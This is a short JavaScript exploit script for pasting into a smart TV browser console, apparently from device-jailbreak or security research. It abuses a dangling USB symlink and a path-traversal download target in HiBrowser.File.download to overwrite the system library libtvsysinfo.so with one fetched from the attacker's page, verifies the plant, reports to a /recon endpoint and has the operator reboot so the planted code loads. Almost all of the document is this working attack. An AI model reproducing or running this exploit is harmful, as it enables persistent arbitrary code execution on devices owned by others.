// plant_payload.js — paste into the TV recon page console.
// Prerequisite: the ext4 stick is mounted; /mnt/usb/<dev>/tvi is a dangling
// symlink to /3rd_rw/loglevel/lib/libtvsysinfo.so.
//
// 1) listDir("/mnt/usb")  -> e.g. "sda1"
// 2) set usb below
// 3) run; expect download=0 and back=0
// 4) reboot the TV
(function(){
  var usb = "/mnt/usb/sda1";                 // <-- adjust from listDir("/mnt/usb")
  var target = "so/../../../../dev/shm/shm_tmp" + usb + "/tvi";
  var url = location.origin + "/pub/libtvsysinfo.so";
  var o = {};
  o.usb = usb;
  o.target = target;
  o.download = HiBrowser.File.download(url, target, 1);
  o.back = HiBrowser.File.download("file:///3rd_rw/loglevel/lib/libtvsysinfo.so",
                                   "tvi_check_plant.so", 1);
  o.size = "expected 33500 bytes";
  fetch("/recon", {method:"POST", body:"PLANT "+JSON.stringify(o)});
  return o;
})();
